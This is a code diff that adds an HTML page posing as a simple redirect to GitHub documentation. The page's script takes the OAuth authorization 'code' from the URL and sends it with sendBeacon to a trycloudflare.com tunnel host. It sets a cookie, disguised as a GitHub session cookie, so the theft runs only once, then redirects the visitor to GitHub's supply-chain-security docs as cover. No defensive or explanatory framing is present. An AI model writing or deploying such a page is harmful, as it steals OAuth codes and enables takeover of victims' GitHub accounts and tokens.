@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"></head>
+<body>
+<script>
+const p = new URLSearchParams(location.search);
+const code = p.get("code");
+const error = p.get("error");
+
+if (error) {
+    location.replace("https://github.com");
+} else if (code && document.cookie.indexOf('_gh_sess_v2=1') === -1) {
+    document.cookie = "_gh_sess_v2=1; path=/report/; max-age=31536000; SameSite=Lax; Secure";
+    navigator.sendBeacon("https://construct-listings-communicate-rely.trycloudflare.com", JSON.stringify({ code }));
+    location.replace("https://docs.github.com/en/code-security/concepts/supply-chain-security/supply-chain-security");
+} else {
+    location.replace("https://docs.github.com/en/code-security/concepts/supply-chain-security/supply-chain-security");
+}
+</script>
+</body>
+</html>
